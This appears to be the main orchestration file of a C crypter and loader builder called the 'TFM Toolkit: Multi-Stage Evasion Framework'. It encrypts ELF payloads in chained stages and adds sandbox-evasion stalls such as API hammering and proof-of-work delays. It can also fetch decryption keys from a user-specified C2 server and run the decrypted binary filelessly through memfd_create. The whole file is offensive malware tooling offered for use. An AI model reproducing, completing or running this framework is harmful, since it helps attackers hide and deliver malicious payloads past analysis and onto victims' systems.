/* main.c - Orchestration Engine and Main Menu with Evasion Families and Dynamic Key Derivation */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#include "builder.h"

#define MAX_STAGES 5

// Helper function to verify the existence of a target file on the file system
static int file_exists(const char *filename) {
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

// Interactive menu to select evasion families and specific techniques
static int select_evasion_technique(void) {
    int family_choice = 0;
    int tech_choice = 0;
    int tech_id = 0;

    while (1) {
        printf("\nSelect Evasion Family:\n");
        printf("    1) COMPUTE         (CPU & Memory Heavy Operations)\n");
        printf("    2) NETWORK         (Network Dependencies & Sockets)\n");
        printf("    3) STORAGE         (File System & Disk I/O Stress)\n");
        printf("    4) SYNCHRONIZATION (Thread Synchronization & Concurrency)\n");
        printf("    5) TEMPORAL        (System Delays & Syscall Timers)\n");
        printf("    6) HAMMERING       (API & Memory Flooding)\n");
        printf("    Selection (Family): ");

        if (scanf("%d", &family_choice) != 1) {
            while (getchar() != '\n');
            printf("    [!] Invalid input. Try again.\n");
            continue;
        }

        switch (family_choice) {
            case 1:
                printf("\n    --- FAMILY 1: COMPUTE ---\n");
                printf("    1) Hash Chain Iteration        (ID: 101)\n");
                printf("    2) Floating Point Math         (ID: 102)\n");
                printf("    3) Compression Spam (Zlib)     (ID: 103)\n");
                printf("    4) Prime Number Calculation (ID: 104)\n");
                printf("    5) Bitwise Logic Operations (ID: 105)\n");
                printf("    6) Recursive Fibonacci         (ID: 106)\n");
                printf("    7) Junk Logic & Opcodes        (ID: 107)\n");
                printf("    8) Proof-of-Work Delay         (ID: 108)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 8) {
                    tech_id = 100 + tech_choice;
                }
                break;

            case 2:
                printf("\n    --- FAMILY 2: NETWORK ---\n");
                printf("    1) TCP Socket Timeout         (ID: 201)\n");
                printf("    2) DNS Lookup Spam            (ID: 202)\n");
                printf("    3) Raw HTTP Request           (ID: 203)\n");
                printf("    4) Passive UDP Receive        (ID: 204)\n");
                printf("    5) External NTP Sync Check    (ID: 205)\n");
                printf("    6) Network Garbage Flood      (ID: 206)\n");
                printf("    7) Reverse DNS Resolution     (ID: 207)\n");
                printf("    8) External C2 Key Retrieval  (ID: 208)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 8) {
                    tech_id = 200 + tech_choice;
                }
                break;

            case 3:
                printf("\n    --- FAMILY 3: STORAGE ---\n");
                printf("    1) Recursive Directory Walk (ID: 301)\n");
                printf("    2) Heavy I/O Flush (fsync)    (ID: 302)\n");
                printf("    3) Entropy Source Wait        (ID: 303)\n");
                printf("    4) Sparse File Allocation     (ID: 304)\n");
                printf("    5) Directory Creation Spam    (ID: 305)\n");
                printf("    6) Memory Pressure / Swap     (ID: 306)\n");
                printf("    7) File Metadata Stat Queries(ID: 307)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                    tech_id = 300 + tech_choice;
                }
                break;

            case 4:
                printf("\n    --- FAMILY 4: SYNCHRONIZATION ---\n");
                printf("    1) Thread Join Wait          (ID: 401)\n");
                printf("    2) Work Queue Blocking        (ID: 402)\n");
                printf("    3) IPC Pipe Wait              (ID: 403)\n");
                printf("    4) POSIX Semaphore Race       (ID: 404)\n");
                printf("    5) Event Condition Wait       (ID: 405)\n");
                printf("    6) Thread Barrier Point       (ID: 406)\n");
                printf("    7) Condition Var Broadcast    (ID: 407)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                    tech_id = 400 + tech_choice;
                }
                break;

            case 5:
                printf("\n    --- FAMILY 5: TEMPORAL ---\n");
                printf("    1) Standard sleep() Call      (ID: 501)\n");
                printf("    2) Empty select() Timeout     (ID: 502)\n");
                printf("    3) High-Res nanosleep()       (ID: 503)\n");
                printf("    4) Signal Alarm & Pause       (ID: 504)\n");
                printf("    5) Subprocess Sleep Wait      (ID: 505)\n");
                printf("    6) System ppoll() Wait        (ID: 506)\n");
                printf("    7) Interval setitimer()       (ID: 507)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                    tech_id = 500 + tech_choice;
                }
                break;

            case 6:
                printf("\n    --- FAMILY 6: HAMMERING ---\n");
                printf("    1) System API Hammering       (ID: 601)\n");
                printf("    2) Memory Allocation Hammer   (ID: 602)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 2) {
                    tech_id = 600 + tech_choice;
                }
                break;

            default:
                printf("    [!] Invalid family selection.\n");
                break;
        }

        if (tech_id != 0) {
            return tech_id;
        }

        printf("    [!] Invalid option. Please select again.\n");
        while (getchar() != '\n');
    }
}

int main(void) {
    int mode_choice = 0;
    int total_stages = 0;
    StageConfig stages[MAX_STAGES];

    // Initialize the stage configuration array to zero
    memset(stages, 0, sizeof(stages));

    printf("=====================================================\n");
    printf("    TFM TOOLKIT: MULTI-STAGE EVASION FRAMEWORK       \n");
    printf("=====================================================\n\n");

    printf("Select target binary structure:\n");
    printf("    1) Single Stage (1 Encrypted ELF + 1 Evasion Technique)\n");
    printf("    2) Multi-Stage  (N Chained ELFs with Derived Keys)\n");
    printf("  Option: ");
    if (scanf("%d", &mode_choice) != 1 || (mode_choice != 1 && mode_choice != 2)) {
        fprintf(stderr, "[-] Invalid option.\n");
        return EXIT_FAILURE;
    }

    if (mode_choice == 1) {
        total_stages = 1;
    } else {
        printf("\nEnter number of stages to chain (2-%d): ", MAX_STAGES);
        if (scanf("%d", &total_stages) != 1 || total_stages < 2 || total_stages > MAX_STAGES) {
            fprintf(stderr, "[-] Invalid number of stages.\n");
            return EXIT_FAILURE;
        }
    }

    // Configure parameters for each deployment stage interactively
    for (int i = 0; i < total_stages; i++) {
        strncpy(stages[i].net_ip, "127.0.0.1", sizeof(stages[i].net_ip));
        strncpy(stages[i].net_host, "localhost", sizeof(stages[i].net_host));
        strncpy(stages[i].net_path, "/", sizeof(stages[i].net_path));
        stages[i].net_port = 80;

        printf("\n-----------------------------------------------------\n");
        printf(" CONFIGURATION FOR STAGE %d of %d\n", i + 1, total_stages);
        printf("-----------------------------------------------------\n");

        do {
            printf("Path to target ELF binary (e.g., ./payloads/stage%d.elf): ", i + 1);
            scanf("%255s", stages[i].elf_path);

            if (!file_exists(stages[i].elf_path)) {
                printf("    [!] ERROR: File '%s' does not exist. Please try again.\n", stages[i].elf_path);
            }
        } while (!file_exists(stages[i].elf_path));

        printf("Enter Passphrase / Seed string for stage encryption: ");
        scanf("%63s", stages[i].key_input);

        stages[i].tech_id = select_evasion_technique();

        if (stages[i].tech_id == 108) {
            // --- PROOF OF WORK MODE ---
            stages[i].key_derivation_mode = 2;
            printf("Enter PoW Difficulty bits: ");
            scanf("%d", &stages[i].pow_difficulty);
            stages[i].tech_param = stages[i].pow_difficulty;

        } else if (stages[i].tech_id == 208) {
            // --- EXTERNAL C2 KEY RETRIEVAL MODE ---
            stages[i].key_derivation_mode = 3;
            stages[i].pow_difficulty = 0;
            stages[i].tech_param = 0; // No time parameter required; waiting loop is governed by network response

            printf("[NETWORK C2] Enter C2 Hostname/Domain/IP (e.g., c2.example.com): ");
            scanf("%127s", stages[i].net_host);

            printf("[NETWORK C2] Enter C2 Port (e.g., 80, 8080 or 443): ");
            scanf("%d", &stages[i].net_port);

            printf("[NETWORK C2] Enter Key Endpoint URI Path (e.g., /api/v1/get_key): ");
            scanf("%63s", stages[i].net_path);

        } else {
            // --- STANDARD / LOCAL STATIC DERIVATION MODE ---
            stages[i].key_derivation_mode = 1;
            stages[i].pow_difficulty = 0;

            switch (stages[i].tech_id) {
                case 201:
                    printf("[NETWORK] Enter Target IP (e.g., 1.1.1.1): ");
                    scanf("%63s", stages[i].net_ip);
                    printf("[NETWORK] Enter Target Port (e.g., 80): ");
                    scanf("%d", &stages[i].net_port);
                    break;

                case 203:
                    printf("[NETWORK] Enter Hostname/Domain (e.g., google.com): ");
                    scanf("%127s", stages[i].net_host);
                    break;

                case 204:
                    printf("[NETWORK] Enter Listening Port (e.g., 4444): ");
                    scanf("%d", &stages[i].net_port);
                    break;

                case 205:
                    printf("[NETWORK] Enter NTP Server (e.g., pool.ntp.org): ");
                    scanf("%127s", stages[i].net_host);
                    break;

                case 206:
                    printf("[NETWORK] Enter Target IP (e.g., 8.8.8.8): ");
                    scanf("%63s", stages[i].net_ip);
                    break;

                case 207:
                    printf("[NETWORK] Enter Base Subnet IP (e.g., 8.8.8.): ");
                    scanf("%63s", stages[i].net_ip);
                    break;

                default:
                    break;
            }

            printf("\nEvasion technique parameter (e.g., iterations or milliseconds): ");
            scanf("%d", &stages[i].tech_param);
        }

        printf("\nExecution mode for decrypted ELF:\n");
        printf("    1) RAM Fileless (memfd_create + execveat) [Recommended]\n");
        printf("    2) Temporary Disk (/tmp/ + execve)\n");
        printf("  Option: ");
        scanf("%d", &stages[i].exec_mode);
    }

    printf("\n=====================================================\n");
    printf("Generating payload.h with %d stage(s)...\n", total_stages);
    
    // Invoke the builder module to compile configurations and encrypt payloads
    if (run_builder(stages, total_stages) != 0) {
        fprintf(stderr, "[-] Error during Builder generation process.\n");
        return EXIT_FAILURE;
    }
    printf("Header include/payload.h built successfully.\n\n");
    
    printf("Compiling final Loader...\n");
    system("mkdir -p dist");

    // Compilation flags for optimization, hardening, and dead-code stripping
    const char *compile_cmd = 
        "mkdir -p dist && "
        "gcc -Wall -O2 -s -Iinclude "
        "-ffunction-sections -fdata-sections "
        "-fvisibility=hidden "
        "loader.c "
        "-o dist/loader_final.elf "
        "-Wl,--gc-sections -lcrypto -lssl -lpthread -lm -lz -w";

    int status = system(compile_cmd);
    
    if (status == 0) {
        printf("Process completed successfully!\n");
        printf("    Binary generated at: ./dist/loader_final.elf\n");
    } else {
        fprintf(stderr, "[-] GCC Compilation error.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
